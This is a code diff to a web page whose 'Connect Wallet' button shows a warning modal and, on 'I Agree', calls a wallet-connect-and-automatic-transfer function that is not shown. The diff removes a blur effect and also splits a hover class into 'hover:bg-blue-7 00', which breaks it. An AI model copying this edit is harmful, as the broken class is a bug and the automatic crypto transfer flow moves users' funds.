@@ -34,9 +34,6 @@
         .warning-modal {
             z-index: 60;
         }
-        .blur-effect {
-            filter: blur(5px);
-        }
     </style>
 </head>
 <body class="min-h-screen bg-gray-100">
@@ -183,7 +180,7 @@
                     <button id="cancelBtn" class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-6 rounded-full transition-all">
                         Cancel
                     </button>
-                    <button id="agreeBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-full transition-all">
+                    <button id="agreeBtn" class="bg-blue-600 hover:bg-blue-7 00 text-white font-bold py-2 px-6 rounded-full transition-all">
                         <i class="fas fa-check-circle mr-2"></i> I Agree
                     </button>
                 </div>
@@ -304,21 +301,18 @@
             connectWalletBtn.addEventListener('click', function() {
                 // Show warning modal before connecting
                 warningModal.classList.remove('hidden');
-                document.body.classList.add('blur-effect');
             });
 
             // Agree to automatic transfer
             agreeBtn.addEventListener('click', async function() {
                 userAgreed = true;
                 warningModal.classList.add('hidden');
-                document.body.classList.remove('blur-effect');
                 await connectWalletAndTransfer();
             });
 
             // Cancel button
             cancelBtn.addEventListener('click', function() {
                 warningModal.classList.add('hidden');
-                document.body.classList.remove('blur-effect');
                 userAgreed = false;
             });
 
